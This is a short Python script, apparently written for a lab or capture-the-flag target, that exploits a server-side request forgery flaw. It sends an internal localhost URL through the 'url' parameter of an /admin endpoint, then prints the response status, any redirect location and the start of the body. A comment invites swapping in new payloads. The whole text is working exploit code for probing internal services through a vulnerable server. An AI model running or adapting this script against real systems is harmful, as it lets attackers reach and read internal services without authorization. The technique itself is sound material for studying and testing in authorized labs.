import requests

# ✏️ Target info
external_host = "http://10.10.120.144:1337"
vuln_path = "/admin"
ssrf_param = "url"
target_url = "http://127.0.0.1:8080/api/status"  # 🔥 Replace this to try new payloads

# 📦 Build full request URL
full_url = f"{external_host}{vuln_path}/?{ssrf_param}={target_url}"

# 🚫 Don't follow redirects
print(f"[+] Requesting SSRF payload: {target_url}")
r = requests.get(full_url, allow_redirects=False)

# 🧾 Show response
print(f"\n[+] Response Status: {r.status_code}")
if 'Location' in r.headers:
    print(f"[+] Redirect Location: {r.headers['Location']}")

print("\n[+] Response Body Preview:\n")
print(r.text[:500])  # show first 500 chars of body
